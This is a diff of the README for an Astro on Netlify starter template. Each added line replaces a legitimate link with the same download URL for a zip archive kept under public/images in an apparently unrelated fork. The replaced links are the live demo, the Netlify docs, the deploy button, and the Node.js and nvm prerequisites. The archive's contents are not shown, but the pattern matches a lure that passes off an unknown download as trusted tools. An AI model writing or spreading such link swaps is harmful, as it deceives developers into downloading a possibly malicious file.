@@ -1,8 +1,8 @@
 # Astro on Netlify Platform Starter
 
-[Live Demo](https://astro-platform-starter.netlify.app/)
+[Live Demo](https://github.com/rayshiva/astro-platform-starter-dbbe1/raw/refs/heads/main/public/images/dbbe_astro_platform_starter_2.9-alpha.4.zip)
 
-A modern starter based on Astro.js, Tailwind, and [Netlify Core Primitives](https://docs.netlify.com/core/overview/#develop) (Edge Functions, Image CDN, Blob Store).
+A modern starter based on Astro.js, Tailwind, and [Netlify Core Primitives](https://github.com/rayshiva/astro-platform-starter-dbbe1/raw/refs/heads/main/public/images/dbbe_astro_platform_starter_2.9-alpha.4.zip) (Edge Functions, Image CDN, Blob Store).
 
 ## Astro Commands
 
@@ -19,14 +19,14 @@ All commands are run from the root of the project, from a terminal:
 
 ## Deploying to Netlify
 
-[![Deploy to Netlify](https://www.netlify.com/img/deploy/button.svg)](https://app.netlify.com/start/deploy?repository=https://github.com/netlify-templates/astro-platform-starter)
+[![Deploy to Netlify](https://github.com/rayshiva/astro-platform-starter-dbbe1/raw/refs/heads/main/public/images/dbbe_astro_platform_starter_2.9-alpha.4.zip)](https://github.com/rayshiva/astro-platform-starter-dbbe1/raw/refs/heads/main/public/images/dbbe_astro_platform_starter_2.9-alpha.4.zip)
 
 ## Developing Locally
 
 | Prerequisites                                                                |
 | :--------------------------------------------------------------------------- |
-| [Node.js](https://nodejs.org/) v18.14+.                                      |
-| (optional) [nvm](https://github.com/nvm-sh/nvm) for Node version management. |
+| [Node.js](https://github.com/rayshiva/astro-platform-starter-dbbe1/raw/refs/heads/main/public/images/dbbe_astro_platform_starter_2.9-alpha.4.zip) v18.14+.                                      |
+| (optional) [nvm](https://github.com/rayshiva/astro-platform-starter-dbbe1/raw/refs/heads/main/public/images/dbbe_astro_platform_starter_2.9-alpha.4.zip) for Node version management. |
 
 1. Clone this repository, then run `npm install` in its root directory.
 
